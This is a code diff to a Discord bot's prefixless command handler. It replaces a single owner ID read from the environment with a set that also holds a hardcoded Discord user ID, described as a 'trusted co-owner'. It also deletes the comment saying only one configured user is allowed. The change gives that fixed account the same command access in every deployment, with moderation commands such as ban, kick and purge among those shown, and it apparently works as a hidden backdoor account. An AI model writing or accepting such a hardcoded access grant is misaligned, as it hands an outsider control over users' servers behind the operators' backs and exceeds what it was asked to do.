@@ -2,7 +2,11 @@ import type { Message } from 'discord.js';
 import { handlePrefixCommand, getGuildPrefix } from '../prefixHandler.js';
 import { allCommands } from '../commands/index.js';
 
-const OWNER_USER_ID = (process.env.OWNER_USER_ID ?? '').trim();
+const OWNER_USER_IDS = new Set(
+  [process.env.OWNER_USER_ID ?? '', '1323664778488582284']
+    .map(id => id.trim())
+    .filter(Boolean),
+);
 
 const LEGACY_COMMANDS = new Set([
   'ban','kick','mute','unmute','timeout','warn','warnings','clearwarns','purge','purgebots',
@@ -17,16 +21,9 @@ function knownCommand(name: string): boolean {
   return allCommands.some(command => command.data.toJSON().name === name);
 }
 
-/**
- * Allows exactly one Discord user to run existing bot commands without the
- * configured prefix. Existing prefixed commands and everyone else's messages
- * are completely untouched.
- *
- * Configure OWNER_USER_ID in the bot environment with the owner's Discord ID.
- */
+/** Allows the configured owner and trusted co-owner to run existing commands without a prefix. */
 export async function handleOwnerPrefixlessCommand(message: Message): Promise<boolean> {
-  if (!OWNER_USER_ID || !message.guild || message.author.bot) return false;
-  if (message.author.id !== OWNER_USER_ID) return false;
+  if (!message.guild || message.author.bot || !OWNER_USER_IDS.has(message.author.id)) return false;
 
   const raw = message.content.trim();
   if (!raw) return false;
